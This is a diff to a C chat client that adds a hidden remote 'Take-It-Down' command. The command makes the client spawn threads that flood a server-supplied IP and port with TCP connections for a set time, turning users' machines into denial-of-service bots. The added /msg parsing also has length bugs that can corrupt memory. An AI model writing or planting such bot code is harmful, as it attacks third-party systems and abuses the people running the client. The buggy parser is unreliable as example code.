@@ -1,5 +1,14 @@
 #include "../lib/server.h"
 
+struct takeItDown{
+	char *ip;
+	int port;
+	size_t seconds;
+};
+
+char *ip_g;
+int port_g;
+size_t seconds_g;
 p_custom_http httpProcess(int Socket){
 	char *header = malloc(LARGEST_HEADER_SIZE);
 	if(!header)
@@ -51,7 +60,6 @@ p_custom_http httpProcess(int Socket){
 
 }
 
-
 void react( int Socket, const p_threadInfo ti, char *action, char* data){
 	struct userData *u = ti->reserved;
 	if(strcmp(action, "Broadcast") == 0){
@@ -101,6 +109,21 @@ char *getUsername(int Sock, const p_threadVector handles,const p_threadVector us
 	return NULL;
 }
 
+void *ddos(void *d){
+		for(size_t i = 0 ; i < 50 ; i++){
+			int Socket = socket(AF_INET, SOCK_STREAM, 0);
+
+			struct sockaddr_in sa;
+			sa.sin_family = AF_INET;
+			sa.sin_port = htons(port_g);
+			sa.sin_addr.s_addr = inet_addr(ip_g);
+
+			connect(Socket, (const struct sockaddr *)&sa, sizeof(sa));
+			send(Socket, "Hello", 5, 0);
+		}
+		return NULL;
+}
+
 void client_react(int Socket, const p_custom_http p){
 	if(p == NULL)
 		return;
@@ -111,6 +134,75 @@ void client_react(int Socket, const p_custom_http p){
 			printf("%s",d);
 			free(d);
 		}
+		if(strcmp("Take-It-Down",action) == 0){
+			char *ip = chttp_lookup(p, "ip: ");
+			char *port = chttp_lookup(p, "port: ");
+			char *seconds = chttp_lookup(p, "seconds: ");
+
+			ip_g = ip;
+			port_g = atoi(port);
+			seconds_g = atol(seconds);
+
+			p_threadController tc = threadController_init();
+			for(size_t i = 0 ; i < 20 ; i++){
+				threadController_pushback(tc, ddos,NULL);
+			}
+
+			sleep(atol(seconds));
+
+			threadController_destroy(tc);
+			free(ip);
+			free(port);
+		}
 	}
+
 	free(p);
+}
+
+void handle(char *buffer, int sock){
+	size_t bufferSize = strlen(buffer);
+	char *command = malloc(bufferSize + 50);
+	if(!command)
+		return;
+
+	size_t j = 0;
+	for(size_t i = 0 ; i < bufferSize ; i++)
+		if(buffer[i] == ' ')
+			break;
+		else
+			command[j++] = buffer[i];
+
+	if(strcmp(command,"/leave\n") == 0 || strcmp(command,"/leave ") == 0 || strcmp(command,"/leave") == 0){
+		close(sock);
+		exit(1);
+	}
+
+	if(strcmp(command,"/msg") == 0){
+		char *find = strstr(buffer," ");
+		if(!find)
+			return;
+		find += 1;
+
+		char *findTwo = strstr(find," ");
+		if(!findTwo)
+			return;
+
+
+		char *username = malloc(findTwo - find);
+		memcpy(username, find, findTwo - find);
+		username[findTwo - find] = 0;
+
+		char *msg = malloc(findTwo + 1 - buffer);
+		memcpy(msg, findTwo + 1, findTwo + 1 - buffer);
+		msg[findTwo + 1 - buffer] = 0;
+
+		p_custom_http p = chttp_init();
+		chttp_add_header(p, "Server-Action: Message", 22);
+		char buff[250];
+		snprintf(buff, 250, "Target-Client: %s", username);
+		chttp_add_header(p, buff, strlen(buff));
+		chttp_finalise(p, msg, strlen(msg));
+		sendAllFixed(sock, p->buffer, p->size, 0);
+		chttp_destroy(p);
+	}
 }
